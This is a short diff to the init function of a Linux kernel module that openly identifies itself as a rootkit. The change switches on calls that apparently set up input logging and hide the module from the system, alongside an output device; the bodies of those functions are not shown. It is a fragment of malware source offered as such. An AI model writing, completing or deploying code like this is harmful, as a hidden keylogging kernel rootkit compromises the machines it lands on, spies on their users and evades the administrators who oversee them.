@@ -8,24 +8,19 @@
 #include "outputDevice.h"
 
 static int __init main_init(void) {
-	
-	//panic();
 	int error;
-	
-	// console_print("Hello, world - this is the kernel speaking\n") ;
-	printk(KERN_INFO "Installing rootkit\n"); // TODO: print time etc..
+	printk(KERN_INFO "Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
 
 	
 	error = outputDevice_init();
 	if (error) return error;
-	/*
+
 	error = logInput_init();
 	if (error) return error;
 	
 	error = moduleHide_init();
 	if (error) return error;
 
-	*/
 	printk(KERN_INFO "Rootkit installed\n");
 	return 0;
 }
